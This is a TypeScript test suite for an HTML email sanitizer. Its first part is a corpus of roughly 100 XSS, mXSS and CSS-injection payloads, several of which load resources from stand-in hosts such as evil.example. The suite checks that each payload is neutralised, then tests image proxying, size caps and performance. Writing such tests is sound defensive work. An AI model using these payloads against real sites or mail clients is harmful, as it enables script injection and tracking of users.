import { JSDOM, VirtualConsole } from "jsdom";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  DATA_IMAGE_MAX_BYTES,
  SanitizeInputError,
  sanitizeForAnalysis,
  sanitizeForViewer,
  type ViewerImageContext,
} from "../src/index";
import { CID_PREFIX, IMG_PREFIX, OUT_PREFIX, problems, rw } from "./oracle";

const PNG_1PX =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
const SVG_B64 = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>').toString(
  "base64",
);

/** XSS / CSS-injection corpus. Each must come out with zero oracle problems. */
const VECTORS: string[] = [
  // classic handlers and schemes
  `<img src=x onerror=alert(1)>`,
  `<img src="javascript:alert(1)">`,
  `<a href="javascript:alert(1)">x</a>`,
  `<a href=" javascript:alert(1)">x</a>`,
  `<a href="jav&#x09;ascript:alert(1)">x</a>`,
  `<a href="jav&#x0A;ascript:alert(1)">x</a>`,
  `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>`,
  `<a href="JaVaScRiPt:alert(1)">x</a>`,
  `<a href="javascript&colon;alert(1)">x</a>`,
  `<a href="&#x01;javascript:alert(1)">x</a>`,
  `<a href="vbscript:msgbox(1)">x</a>`,
  `<a href="data:text/html,<script>alert(1)</script>">x</a>`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
  `<img src="data:image/svg+xml;base64,${SVG_B64}">`,
  `<img src="data:image/png;base64,${SVG_B64}">`,
  `<img src="data:text/html,<script>alert(1)</script>">`,
  `<body onload="alert(1)"><p>x</p></body>`,
  `<details open ontoggle=alert(1)>x</details>`,
  `<marquee onstart=alert(1)>x</marquee>`,
  `<div onmouseover="alert(1)" style="position:fixed;inset:0">x</div>`,
  // script-bearing and embedding elements
  `<script>alert(1)</script>`,
  `<iframe src="javascript:alert(1)"></iframe>`,
  `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  `<object data="http://evil.example/x.swf"></object>`,
  `<embed src="http://evil.example/x.swf">`,
  `<portal src="http://evil.example/"></portal>`,
  `<frameset onload=alert(1)><frame src="http://evil.example/"></frameset>`,
  `<template><script>alert(1)</script></template>`,
  `<noembed><img src=x onerror=alert(1)></noembed>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
  `<xmp><img src=x onerror=alert(1)></xmp>`,
  // document-level
  `<base href="http://evil.example/"><a href="x">x</a>`,
  `<meta http-equiv="refresh" content="0;url=http://evil.example/">`,
  `<meta http-equiv="set-cookie" content="a=b">`,
  `<link rel="stylesheet" href="http://evil.example/x.css">`,
  `<link rel="dns-prefetch" href="//tracker.example"><link rel="preconnect" href="https://tracker.example"><link rel="preload" as="image" href="https://tracker.example/p.gif">`,
  // forms
  `<form action="http://evil.example/"><input name="p"><button formaction="javascript:alert(1)">b</button></form>`,
  `<isindex action="javascript:alert(1)" type="image">`,
  `<input type="image" src="http://evil.example/x.png">`,
  // media
  `<video poster="http://evil.example/p.png" src="http://evil.example/v.mp4"></video>`,
  `<audio src="http://evil.example/a.mp3"></audio>`,
  `<picture><source srcset="http://evil.example/a.png"><img src="https://i.example/ok.png"></picture>`,
  `<img srcset="http://evil.example/1x.png 1x, http://evil.example/2x.png 2x" src="https://i.example/a.png">`,
  `<a href="https://shop.example/" ping="https://tracker.example/ping">x</a>`,
  `<img src="https://i.example/a.png" usemap="#m"><map name="m"><area href="javascript:alert(1)"></map>`,
  // SVG / MathML and namespace confusion (mXSS)
  `<svg><use href="http://evil.example/x.svg#a"/></svg>`,
  `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
  `<svg><style>a{background:url(http://evil.example/)}</style></svg>`,
  `<svg><p><style><img src=x onerror=alert(1)></style></p></svg>`,
  `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`,
  `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>`,
  `<math><mi xlink:href="javascript:alert(1)">x</mi></math>`,
  `<math><mi><svg><style><img src=x onerror=alert(1)></style></svg></mi></math>`,
  `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`,
  `<math><annotation-xml encoding="text/html"><style><img src=x onerror=alert(1)></style></annotation-xml></math>`,
  `<table><style><img src=x onerror=alert(1)></style></table>`,
  // CSS injection
  `<style>@import 'http://evil.example/x.css';</style>`,
  `<style>@import url(http://evil.example/x.css);</style>`,
  `<style>@IMPORT url(http://evil.example/x.css);</style>`,
  `<style>@\\69mport url(http://evil.example/x.css);</style>`,
  `<style>@font-face{font-family:x;src:url(http://evil.example/f.woff)}</style>`,
  `<style>@namespace url(http://evil.example/);</style>`,
  `<style>@-moz-document url-prefix(){a{color:red}}</style>`,
  `<style>a{background:u\\rl(http://evil.example/x)}</style>`,
  `<style>a{background:\\75 rl(http://evil.example/x)}</style>`,
  `<style>a{background:u\\72 l(http://evil.example/x)}</style>`,
  `<style>a{background:ur/**/l(http://evil.example/x)}</style>`,
  `<style>a{width:expression(alert(1))}</style>`,
  `<style>a{width:ex\\70 ression(alert(1))}</style>`,
  `<style>a{behavior:url(http://evil.example/x.htc)}</style>`,
  `<style>a{-moz-binding:url(http://evil.example/x.xml#b)}</style>`,
  `<style>a{-moz-\\62 inding:url(http://evil.example/x.xml#b)}</style>`,
  `<style>a{--x:url(http://evil.example/v);background:var(--x)}</style>`,
  `<style>a{background:var(--y, url(http://evil.example/fb))}</style>`,
  `<style>a{background-image:image-set("http://evil.example/a.png" 1x)}</style>`,
  `<style>a{background-image:-webkit-image-set("http://evil.example/a.png" 1x)}</style>`,
  `<style>@media screen{a{background:url(//evil.example/m.png)}}</style>`,
  `<style>@supports (background:url(http://evil.example/s)){a{color:red}}</style>`,
  `<style>a{content:"</style><script>alert(1)</script>"}</style>`,
  `<style>a{content:attr(title)} b{background:image("http://evil.example/i.png")}</style>`,
  `<style><!-- a{color:red} --></style><img src=x onerror=alert(1)>`,
  `<div style="background:url(//evil.example/x.png)">x</div>`,
  `<div style="background:url(&quot;http://evil.example/x.png&quot;)">x</div>`,
  `<div style="width:expression(alert(1))">x</div>`,
  `<div style="behavior:url(x.htc)">x</div>`,
  `<p style="-o-link:'javascript:alert(1)';-o-link-source:current">o</p>`,
  `<div style="color:red} body{background:url(http://evil.example/)">x</div>`,
  `<div style="background-image:url(javascript:alert(1))">x</div>`,
  `<table background="javascript:alert(1)"><tr><td background="relative.png">x</td></tr></table>`,
  `<a href="//evil.example/">protocol-relative</a>`,
  `<a href="/relative">relative</a><img src="/rel.png"><img src="rel.png">`,
  `<a id="</style><img src=x onerror=alert(1)>">x</a>`,
  `<a title="--><img src=x onerror=alert(1)>">x</a>`,
  `<div data-x="1" data-o="5" data-tt-policy-suffix="x">x</div>`,
  `<!--[if mso]><v:rect xmlns:v="urn:schemas-microsoft-com:vml" fill="true"><v:fill src="http://evil.example/bg.png"/></v:rect><![endif]-->`,
  `<a href="https://x.example/" download="x.exe" target="_self" rel="opener">x</a>`,
];

describe("viewer profile: XSS / CSS-injection corpus", () => {
  it.each(VECTORS.map((v) => [v]))("%s", (vector) => {
    const out = sanitizeForViewer(vector, rw).html;
    expect(problems(out)).toEqual([]);
    // Sanitizing the output again must be stable and still safe (no mXSS on re-parse).
    expect(problems(sanitizeForViewer(out, rw).html)).toEqual([]);
  });

  it("the whole corpus concatenated is safe", () => {
    expect(problems(sanitizeForViewer(VECTORS.join("\n"), rw).html)).toEqual([]);
  });
});

describe("viewer profile: rewrites", () => {
  it("proxies images, cid parts, backgrounds and CSS urls; rewrites links", () => {
    const html = `<html><head><style>.h{background-image:url('https://i.example/hero.jpg')}</style></head>
      <body background="https://i.example/bg.png">
      <img src="https://i.example/a.png" alt="A" width="600" height="300">
      <img src="cid:<Image001.PNG@01DA>" alt="cid">
      <table><tr><td style="background:#fff url(http://i.example/td.png) no-repeat">x</td></tr></table>
      <a href="https://shop.example/p?q=1&amp;r=2">Shop</a> <a href="mailto:hi@shop.example">Mail</a></body></html>`;
    const r = sanitizeForViewer(html, rw);
    expect(problems(r.html)).toEqual([]);
    expect(r.html).toContain(
      `${IMG_PREFIX}${Buffer.from("https://i.example/a.png").toString("base64url")}`,
    );
    expect(r.html).toContain(`${CID_PREFIX}image001.png%4001da`);
    expect(r.html).toContain(
      `${OUT_PREFIX}${encodeURIComponent("https://shop.example/p?q=1&r=2")}`,
    );
    expect(r.html).toContain(`${OUT_PREFIX}${encodeURIComponent("mailto:hi@shop.example")}`);
    expect(r.images).toBe(5); // hero (css), bg, a.png, cid, td (css)
    expect(r.links).toBe(2);
  });

  it("marks every kept image lazy + async (overriding the email's own values), never in analysis", () => {
    const html =
      `<img src="https://i.example/a.png" loading="eager" decoding="sync" alt="A">` +
      `<img src="data:image/png;base64,${PNG_1PX}">` +
      `<img src="javascript:alert(1)" alt="dropped">` +
      `<table background="https://i.example/bg.png"><tr><td>x</td></tr></table>`;
    const out = sanitizeForViewer(html, rw).html;
    const view = new JSDOM(out, { virtualConsole: new VirtualConsole() }).window.document;
    const imgs = [...view.querySelectorAll("img")];
    expect(imgs.map((i) => [i.getAttribute("loading"), i.getAttribute("decoding")])).toEqual([
      ["lazy", "async"],
      ["lazy", "async"],
      [null, null], // no src left: nothing to load
    ]);
    expect(view.querySelector("table")?.hasAttribute("loading")).toBe(false);
    expect(problems(out)).toEqual([]);
    const analysis = sanitizeForAnalysis(
      `<img src="https://i.example/a.png"><img src="https://i.example/b.png">`,
    );
    expect(analysis).not.toMatch(/loading=|decoding=/);
  });

  it("passes normalized absolute URLs to the rewriters", () => {
    const seen: string[] = [];
    sanitizeForViewer(
      `<img src=" HTTPS://I.Example/a b.png "><a href="https://Shop.Example">x</a>`,
      {
        image: (u) => (seen.push(u), `${IMG_PREFIX}x`),
        cid: () => null,
        link: (u) => (seen.push(u), `${OUT_PREFIX}x`),
      },
    );
    expect(seen).toEqual(["https://i.example/a%20b.png", "https://shop.example/"]);
  });

  it("passes each image's raw sizing attributes, so the rewriter can refuse pixels", () => {
    const seen: Array<[string, ViewerImageContext]> = [];
    const r = sanitizeForViewer(
      `<html><head><style>.h{background:url(https://i.example/sheet.png)}</style></head><body>
       <img style="display:none" height="1px" src="https://i.example/o.gif" width="1">
       <img src="https://i.example/hero.png" alt="Hero">
       <table><tr><td background="https://i.example/bg.png" width="2" height="2">x</td>
       <td style="visibility:hidden;background:url(https://i.example/td.png)">y</td></tr></table></body></html>`,
      {
        image: (u, context) => {
          seen.push([u, context]);
          return context.width === "1" || context.style?.includes("hidden") ? null : `${IMG_PREFIX}x`;
        },
        cid: () => null,
        link: () => null,
      },
    );
    expect(Object.fromEntries(seen)).toEqual({
      "https://i.example/sheet.png": { kind: "css", width: null, height: null, style: null },
      "https://i.example/o.gif": { kind: "img", width: "1", height: "1px", style: "display:none" },
      "https://i.example/hero.png": { kind: "img", width: null, height: null, style: null },
      "https://i.example/bg.png": { kind: "background-attr", width: "2", height: "2", style: null },
      "https://i.example/td.png": {
        kind: "css",
        width: null,
        height: null,
        style: "visibility:hidden;background:url(https://i.example/td.png)",
      },
    });
    expect(r.images).toBe(3); // sheet, hero, bg: the 1×1 img and the hidden cell's url are dropped
    expect(r.html).not.toContain("o.gif");
  });

  it("drops images the rewriter refuses but keeps alt/width/height; disables refused links", () => {
    const r = sanitizeForViewer(
      `<img src="https://tracker.example/p.gif" alt="logo" width="1" height="1"><a href="https://x.example/">Keep text</a>`,
      {
        image: () => null,
        cid: () => null,
        link: () => null,
      },
    );
    expect(r.html).toContain('<img alt="logo" width="1" height="1">');
    expect(r.html).toContain("<a>Keep text</a>");
    expect(r.images).toBe(0);
    expect(r.links).toBe(0);
  });

  it("refuses rewriter output that isn't an absolute http(s) URL", () => {
    const r = sanitizeForViewer(
      `<img src="https://i.example/a.png"><a href="https://x.example/">x</a>`,
      {
        image: () => "javascript:alert(1)",
        cid: () => null,
        link: () => "/out?u=relative",
      },
    );
    expect(r.html).not.toMatch(/javascript:|\/out\?u=relative/);
    expect(r.images + r.links).toBe(0);
  });

  it("allows data:image ≤ 256 KB with real raster bytes only", () => {
    const small = `data:image/png;base64,${PNG_1PX}`;
    expect(sanitizeForViewer(`<img src="${small}">`, rw).html).toContain(small);
    const big = `data:image/png;base64,${PNG_1PX}${"A".repeat(DATA_IMAGE_MAX_BYTES)}`;
    expect(sanitizeForViewer(`<img src="${big}" alt="big">`, rw).html).toContain('<img alt="big">');
  });

  it("drops <title>, <meta>, conditional comments; adds a doctype; keeps text", () => {
    const r = sanitizeForViewer(
      `<html><head><title>Secret</title><meta charset="utf-8"></head><body><!--[if mso]>x<![endif]--><p>Hello</p></body></html>`,
      rw,
    );
    expect(r.html.startsWith("<!DOCTYPE html>\n<html>")).toBe(true);
    expect(r.html).not.toMatch(/<title|<meta|Secret|\[if mso\]/);
    expect(r.html).toContain("<p>Hello</p>");
  });

  it("caps <style> CSS at 64 KB per document", () => {
    const rule = (i: number) =>
      `.c${i}{color:#${(i % 4096).toString(16).padStart(3, "0")};padding:${i % 50}px}`;
    const css = Array.from({ length: 6000 }, (_, i) => rule(i)).join("");
    const r = sanitizeForViewer(`<style>${css}</style><style>${css}</style>`, rw);
    const styles = [...r.html.matchAll(/<style>([\s\S]*?)<\/style>/g)].map((m) => m[1] ?? "");
    expect(styles.reduce((n, s) => n + Buffer.byteLength(s), 0)).toBeLessThanOrEqual(64 * 1024);
    expect(problems(r.html)).toEqual([]);
  });

  it("refuses oversized and non-string input", () => {
    expect(() => sanitizeForViewer("x".repeat(10 * 1024 * 1024 + 1), rw)).toThrow(
      SanitizeInputError,
    );
    expect(() => sanitizeForViewer(42 as unknown as string, rw)).toThrow(SanitizeInputError);
    expect(() => sanitizeForViewer("<p>x</p>", {} as never)).toThrow(TypeError);
  });
});

describe("viewer profile: hostile data: values stay linear", () => {
  // A whitespace run then a non-base64 character: the old DATA_IMAGE_RE backtracked
  // quadratically on it (about 70 s for one 256 KB value).
  const padded = (n: number) => `data:image/png;base64,${PNG_1PX.slice(0, 16)}${" ".repeat(n)}!`;

  it("refuses whitespace-padded data: values in img, background and style quickly", () => {
    const big = padded(DATA_IMAGE_MAX_BYTES - 64);
    const mid = padded(64 * 1024);
    const html = `<img src="${big}" alt="x"><table background="${mid}"><tr><td style="background:url('${mid}')">x</td></tr></table>`;
    const t0 = performance.now();
    const r = sanitizeForViewer(html, rw);
    expect(performance.now() - t0).toBeLessThan(1000);
    expect(r.html).not.toContain("data:");
    expect(r.html).toContain('<img alt="x">');
  });

  it("still accepts base64 wrapped with whitespace, also before the padding", () => {
    const wrapped = `${PNG_1PX.slice(0, -2).replace(/(.{20})/g, "$1\n  ")} \n==`;
    const out = sanitizeForViewer(`<img src="data:image/png;base64,${wrapped}">`, rw).html;
    expect(out).toContain(`src="data:image/png;base64,${PNG_1PX}"`);
  });
});

describe("viewer profile: image tokens only for images that reach the output", () => {
  /** Like apps/web view-source.ts: at most 60 tokens, and every call that returns one counts. */
  function capped() {
    const minted: string[] = [];
    const image = (u: string) => (minted.length >= 60 ? null : (minted.push(u), rw.image(u)));
    return { minted, rw: { ...rw, image } };
  }
  const proxied = (html: string) => html.split(IMG_PREFIX).length - 1;
  const hero = `${IMG_PREFIX}${Buffer.from("https://i.example/hero.png").toString("base64url")}`;
  function filler(bytes: number): string {
    let css = "";
    for (let i = 0; css.length < bytes; i++) css += `.f${i}{color:#123;padding:1px}`;
    return css;
  }
  const bgRules = (tag: string) =>
    Array.from(
      { length: 60 },
      (_, i) => `.${tag}${i}{background:url(https://i.example/${tag}${i}.png)}`,
    ).join("");

  it("CSS url()s past the 64 KB <style> cap mint nothing, so body images keep their tokens", () => {
    const t = capped();
    const r = sanitizeForViewer(
      `<style>${filler(71 * 1024)}${bgRules("b")}</style><img src="https://i.example/hero.png" alt="hero">`,
      t.rw,
    );
    expect(r.html).toContain(`src="${hero}"`);
    expect(t.minted).toEqual(["https://i.example/hero.png"]);
    expect(r.images).toBe(1);
  });

  it("mints exactly the tokens that appear in the output, wherever the cap falls", () => {
    for (const kb of [0, 20, 40, 52, 56, 58, 60, 62, 63, 64]) {
      const t = capped();
      const r = sanitizeForViewer(
        `<style>${filler(kb * 1024)}${bgRules("b")}</style><style>${bgRules("s")}</style><img src="https://i.example/hero.png">`,
        t.rw,
      );
      expect(t.minted.length, `${kb} KB`).toBe(proxied(r.html));
      expect(r.images, `${kb} KB`).toBe(proxied(r.html));
      expect(problems(r.html), `${kb} KB`).toEqual([]);
    }
  });

  it("a style attribute cut at its 64 KB cap mints nothing for the cut url", () => {
    // Room for `;background:url()` but not for the rewritten url.
    let decls = "margin:0";
    for (let i = 0; decls.length < 64 * 1024 - 60; i++) decls += `;padding-left:${i}px`;
    const div = (i: number) =>
      `<div style="${decls};background:url(https://i.example/d${i}.png)">x</div>`;
    const t = capped();
    const r = sanitizeForViewer(
      `${Array.from({ length: 10 }, (_, i) => div(i)).join("")}<img src="https://i.example/hero.png">`,
      t.rw,
    );
    expect(t.minted).toEqual(["https://i.example/hero.png"]);
    expect(r.images).toBe(1);
    expect(r.html).toContain(`src="${hero}"`);
    expect(r.html).toContain("padding-left:");
  });

  it("mints nothing for urls in CSS that is discarded after the url was seen", () => {
    for (const html of [
      // a later denied function drops the declaration
      `<div style="background:url(https://i.example/a.png) attr(x)">x</div>`,
      // the paranoid scan rejects the sheet
      `<style>b{background:url(https://i.example/b.png)} a{content:"\\6a avascript:"}</style>`,
      // DOMPurify removes a <style> in a foreign namespace after uponSanitizeElement
      `<svg><style>a{background:url(https://i.example/c.png)}</style></svg>`,
      `<math><style>a{background:url(https://i.example/d.png)}</style></math>`,
      // DOMPurify removes a style value its attribute probes match after our hook
      `<div style="content:'--&gt;';background:url(https://i.example/e.png)">x</div>`,
      `<div style="content:']&gt;';background:url(https://i.example/e.png)">x</div>`,
      // a sibling url that is refused anyway
      `<div style="background:url(https://i.example/f.png),url(/relative.png)">x</div>`,
    ]) {
      const t = capped();
      const r = sanitizeForViewer(html, t.rw);
      expect(t.minted, html).toEqual([]);
      expect(r.images, html).toBe(0);
      expect(proxied(r.html), html).toBe(0);
    }
  });

  it("keeps a style value with `/>`, which DOMPurify keeps (ALLOW_SELF_CLOSE_IN_ATTR)", () => {
    const t = capped();
    const r = sanitizeForViewer(
      `<div style="content:'/&gt;';background:url(https://i.example/e.png)">x</div>`,
      t.rw,
    );
    expect(t.minted).toEqual(["https://i.example/e.png"]);
    expect(r.images).toBe(1);
    expect(proxied(r.html)).toBe(1);
  });

  it("a declaration with several urls mints nothing unless all of them fit", () => {
    const pairs = (i: number) =>
      [
        `.p${i}{background:url(https://i.example/a${i}.png),url(https://i.example/b${i}.png)}`,
        `.q${i}{background:image-set(url(https://i.example/c${i}.png) 1x,"https://i.example/d${i}.png" 2x)}`,
      ][i % 2];
    const rules = Array.from({ length: 60 }, (_, i) => pairs(i)).join("");
    // Room for one reserve but not two, for two, and for a few declarations.
    for (const room of [8250, 8300, 12_000, 16_500, 17_000, 25_000, 40_000]) {
      const t = capped();
      const r = sanitizeForViewer(
        `<style>${filler(64 * 1024 - room)}${rules}</style><img src="https://i.example/hero.png">`,
        t.rw,
      );
      expect(t.minted.length, `${room}`).toBe(proxied(r.html));
      expect(r.images, `${room}`).toBe(proxied(r.html));
      // With more room, real tokens legitimately use up the 60.
      if (room <= 17_000) expect(r.html, `${room}`).toContain(`src="${hero}"`);
    }
  });

  it("a sibling url refused without a side effect drops the declaration before any mint", () => {
    const t = capped();
    const r = sanitizeForViewer(
      `<style>a{background:url(https://i.example/g.png),url(cid:missing)}</style>` +
        `<div style="background:url(https://i.example/h.png),url(cid:missing)">x</div>`,
      { ...t.rw, cid: () => null },
    );
    expect(t.minted).toEqual([]);
    expect(r.images).toBe(0);
  });

  it("a sibling url the rewriter refuses after minting one leaves an empty image in its place", () => {
    const t = capped();
    const image = (u: string) => (u.includes("deny") ? null : t.rw.image(u));
    const r = sanitizeForViewer(
      `<style>a{background:url(https://i.example/a.png),url(https://i.example/deny1.png)}` +
        `b{background:url(https://i.example/deny2.png),url(https://i.example/b.png)}</style>` +
        `<div style="background:image-set('https://i.example/c.png' 1x,'https://i.example/deny3.png' 2x)">x</div>`,
      { ...t.rw, image },
    );
    expect(t.minted).toEqual(["https://i.example/a.png", "https://i.example/c.png"]);
    expect(r.images).toBe(2);
    expect(proxied(r.html)).toBe(2);
    expect(r.html.match(/url\(data:image\/gif;base64,/g)?.length).toBe(2);
    expect(problems(r.html)).toEqual([]);
  });

  it("<template> content, which DOMPurify walks but never outputs, mints nothing", () => {
    const many = (f: (i: number) => string) => Array.from({ length: 60 }, (_, i) => f(i)).join("");
    for (const inner of [
      `<style>${bgRules("t")}</style>`,
      many((i) => `<img src="https://i.example/ti${i}.png">`),
      many((i) => `<div style="background:url(https://i.example/td${i}.png)"></div>`),
      many((i) => `<table background="https://i.example/tb${i}.png"></table>`),
      `<template>${many((i) => `<img src="https://i.example/tt${i}.png">`)}</template>`,
    ]) {
      const t = capped();
      const r = sanitizeForViewer(
        `<template>${inner}</template><img src="https://i.example/hero.png">`,
        t.rw,
      );
      expect(t.minted).toEqual(["https://i.example/hero.png"]);
      expect(r.images).toBe(1);
      expect(r.html).toContain(`src="${hero}"`);
    }
  });

  it("reserves the rewriter's declared imageMaxLength per CSS url, not the 8 KB default", () => {
    const html = `<style>${filler(64 * 1024 - 5000)}.a{background:url(https://i.example/a.png)}.z{color:red}</style>`;
    const t = capped();
    const r = sanitizeForViewer(html, { ...t.rw, imageMaxLength: 200 });
    expect(t.minted).toEqual(["https://i.example/a.png"]);
    expect(r.images).toBe(1);
    expect(proxied(r.html)).toBe(1);
    expect(r.html).toContain(".z{color:red}");
    const d = capped();
    expect(sanitizeForViewer(html, d.rw).images).toBe(0); // 5000 bytes < the 8192 default
    expect(d.minted).toEqual([]);
  });

  it("drops an image URL longer than imageMaxLength and refuses a bad imageMaxLength", () => {
    const r = sanitizeForViewer(`<img src="https://i.example/a.png">`, {
      ...rw,
      imageMaxLength: 20,
    });
    expect(r.images).toBe(0);
    expect(r.html).not.toContain("src=");
    for (const imageMaxLength of [0, -1, 1.5, Number.NaN, "100"]) {
      expect(() =>
        sanitizeForViewer("<p>x</p>", { ...rw, imageMaxLength } as unknown as typeof rw),
      ).toThrow(TypeError);
    }
  });

  it("counts the escapes CSS writes in a rewritten url, so a later url cannot overflow its rule", () => {
    // 1000 bytes reserved per url. The first comes back as 418 chars, 818 once CSS escapes its
    // parentheses: too little room is left for the second, which is not sent to the rewriter.
    const rule = `.a{background:url(https://i.example/1.png);border-image:url(https://i.example/2.png)}`;
    const blank = ".a{background:url();border-image:url()}";
    const minted: string[] = [];
    const image = (u: string) => {
      minted.push(u);
      return u.endsWith("/1.png")
        ? `https://p.example/${"(".repeat(400)}`
        : `https://p.example/${"a".repeat(880)}`;
    };
    const r = sanitizeForViewer(
      `<style>${filler(64 * 1024 - 1600 - blank.length)}${rule}.z{color:red}</style>`,
      { ...rw, image, imageMaxLength: 1000 },
    );
    expect(minted).toEqual(["https://i.example/1.png"]);
    expect(r.images).toBe(1);
    expect(r.html).toContain(`.a{background:url(https://p.example/${"\\(".repeat(400)})}`);
    expect(r.html).toContain(".z{color:red}");
  });

  it("refuses a CSS url result longer than imageMaxLength once escaped, keeping the rest", () => {
    // Room for both 1000-byte reserves; the second result is 998 chars but 1978 escaped.
    const rule = `.a{background:url(https://i.example/a.png),url(https://i.example/p.png)}`;
    const blank = ".a{background:url(),url()}";
    const minted: string[] = [];
    const image = (u: string) => {
      minted.push(u);
      return u.endsWith("/p.png")
        ? `https://p.example/${"(".repeat(980)}`
        : `https://p.example/${"a".repeat(482)}`;
    };
    const r = sanitizeForViewer(
      `<style>${filler(64 * 1024 - 2240 - blank.length)}${rule}.z{color:red}</style>`,
      { ...rw, image, imageMaxLength: 1000 },
    );
    expect(minted).toEqual(["https://i.example/a.png", "https://i.example/p.png"]);
    expect(r.images).toBe(1);
    expect(r.html).toContain(
      `url(https://p.example/${"a".repeat(482)}),url(data:image/gif;base64,`,
    );
    expect(r.html).not.toContain("\\(");
    expect(r.html).toContain(".z{color:red}");
  });

  it("reserves room for the blank image a later refused url becomes, even below its size", () => {
    // imageMaxLength 40 < BLANK_IMAGE (78 bytes): the second url needs 78 bytes of room, not 40.
    const rule = `.a{background:url(https://i.example/a.png),url(https://i.example/b.png)}`;
    const blank = ".a{background:url(),url()}";
    const sheet = (room: number) => {
      const base = filler(64 * 1024 - 2000);
      const pad = 64 * 1024 - room - blank.length - base.length - "{color:red}".length - 1;
      return `<style>${base}.${"p".repeat(pad)}{color:red}${rule}</style>`;
    };
    const run = (room: number) => {
      const minted: string[] = [];
      const image = (u: string) => {
        minted.push(u);
        return u.endsWith("/a.png") ? `https://p.example/${"a".repeat(12)}` : null;
      };
      const r = sanitizeForViewer(sheet(room), { ...rw, image, imageMaxLength: 40 });
      return { minted, images: r.images, blank: r.html.includes("url(data:image/gif;base64,") };
    };
    // At 100 bytes, a 40-byte reserve each let the first url mint, then dropped both at 30 + 78.
    for (const room of [100, 117])
      expect(run(room)).toEqual({ minted: [], images: 0, blank: false });
    expect(run(118)).toEqual({
      minted: ["https://i.example/a.png", "https://i.example/b.png"],
      images: 1,
      blank: true,
    });
  });
});

describe("per-call state never leaks", () => {
  afterEach(() => vi.restoreAllMocks());

  it("alternating profiles and rewriters stay isolated", () => {
    const html = `<img src="https://i.example/a.png"><a href="https://x.example/">x</a><style>a{background:url(https://i.example/c.png)}</style>`;
    const a = sanitizeForViewer(html, {
      image: () => "https://a.example/img",
      cid: () => null,
      link: () => "https://a.example/out",
    });
    const analysis = sanitizeForAnalysis(html);
    const b = sanitizeForViewer(html, {
      image: () => "https://b.example/img",
      cid: () => null,
      link: () => "https://b.example/out",
    });
    expect(a.html).not.toContain("b.example");
    expect(b.html).not.toContain("a.example");
    expect(analysis).not.toMatch(/a\.example|b\.example/);
    expect(analysis).toContain('src="https://i.example/a.png"');
  });

  it("recovers after a rewriter throws, and refuses re-entrant calls", () => {
    expect(() =>
      sanitizeForViewer(`<img src="https://i.example/a.png">`, {
        image: () => {
          throw new Error("boom");
        },
        cid: () => null,
        link: () => null,
      }),
    ).toThrow("boom");
    expect(sanitizeForViewer(`<img src="https://i.example/a.png">`, rw).images).toBe(1);
    expect(() =>
      sanitizeForViewer(`<img src="https://i.example/a.png">`, {
        image: () => sanitizeForViewer("<p>x</p>", rw).html,
        cid: () => null,
        link: () => null,
      }),
    ).toThrow(/re-entrant/);
    expect(sanitizeForViewer(`<a href="https://x.example/">x</a>`, rw).links).toBe(1);
  });

  it("never writes to the console (jsdom CSS errors would leak email content)", () => {
    const spies = (["log", "warn", "error", "info", "debug"] as const).map((m) =>
      vi.spyOn(console, m).mockImplementation(() => undefined),
    );
    sanitizeForViewer(
      `<style>}}}{{{ a{color:red;;; @media{{{ </style><div style="{{{">x</div>`,
      rw,
    );
    sanitizeForAnalysis(`<style>@@@ {{{ a{</style>`);
    for (const s of spies) expect(s).not.toHaveBeenCalled();
  });
});

describe("performance", () => {
  it("sanitizes a ~100 KB newsletter in < 150 ms warm", () => {
    const block = (i: number) => `
      <tr><td class="c" style="padding:24px 32px;font-family:Georgia,'Times New Roman',serif;color:#222;background:#ffffff url(https://cdn.news.example/bg${i}.png) no-repeat">
        <h2 style="font-size:22px;line-height:1.3;margin:0 0 8px;">Story ${i}: why small teams ship faster</h2>
        <img src="https://cdn.news.example/img/${i}.jpg" width="560" height="280" alt="Story ${i}" style="display:block;width:100%;max-width:560px;height:auto;border:0">
        <p style="font-size:16px;line-height:1.6;margin:12px 0;">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam. Sed nisi. Nulla quis sem at nibh elementum imperdiet.</p>
        <a href="https://news.example/story/${i}?utm_source=email&amp;utm_medium=newsletter" style="display:inline-block;padding:12px 20px;background:#0a66c2;color:#fff;text-decoration:none;border-radius:4px">Read more</a>
      </td></tr>`;
    const css = Array.from(
      { length: 60 },
      (_, i) =>
        `@media (max-width:620px){.c${i}{padding:16px !important;font-size:15px !important}}`,
    ).join("");
    let body = "";
    for (let i = 0; body.length < 100_000; i++) body += block(i);
    const html = `<!DOCTYPE html><html lang="en"><head><style>${css}</style></head><body><table role="presentation" width="100%">${body}</table></body></html>`;
    expect(html.length).toBeGreaterThanOrEqual(100_000);
    for (let i = 0; i < 3; i++) sanitizeForViewer(html, rw); // warm-up
    const times: number[] = [];
    for (let i = 0; i < 5; i++) {
      const t0 = performance.now();
      const r = sanitizeForViewer(html, rw);
      times.push(performance.now() - t0);
      expect(r.images).toBeGreaterThan(100);
    }
    times.sort((a, b) => a - b);
    expect(times[2]).toBeLessThan(150);
  });
});
